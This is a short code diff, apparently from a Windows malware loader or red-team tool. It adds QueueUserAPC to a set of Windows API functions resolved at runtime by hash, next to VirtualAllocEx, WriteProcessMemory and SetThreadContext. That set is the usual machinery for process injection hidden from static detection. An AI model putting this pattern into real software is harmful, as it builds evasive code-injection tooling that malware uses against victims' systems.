@@ -16,6 +16,7 @@ CTIME_HASHA(SetThreadContext);
 CTIME_HASHA(ResumeThread);
 CTIME_HASHA(WriteProcessMemory);
 CTIME_HASHA(OpenProcess);
+CTIME_HASHA(QueueUserAPC);
 
 //VirtualAllocEx
 typedef LPVOID (WINAPI* fnVirtualAllocEx)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
@@ -60,3 +61,7 @@ extern fnWriteProcessMemory pWriteProcessMemory = (fnWriteProcessMemory)GetProcA
 //OpenProcess
 typedef HANDLE (WINAPI* fnOpenProcess)(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId);
 extern fnOpenProcess pOpenProcess = (fnOpenProcess)GetProcAddressH(GetModuleHandleA("KERNEL32.DLL"), OpenProcess_Rotr32A);
+
+//QueueUserAPC
+typedef DWORD  (WINAPI* fnQueueUserAPC)(PAPCFUNC pfnAPC, HANDLE hThread, ULONG_PTR dwData);
+extern fnQueueUserAPC pQueueUserAPC = (fnQueueUserAPC)GetProcAddressH(GetModuleHandleA("KERNEL32.DLL"), QueueUserAPC_Rotr32A);
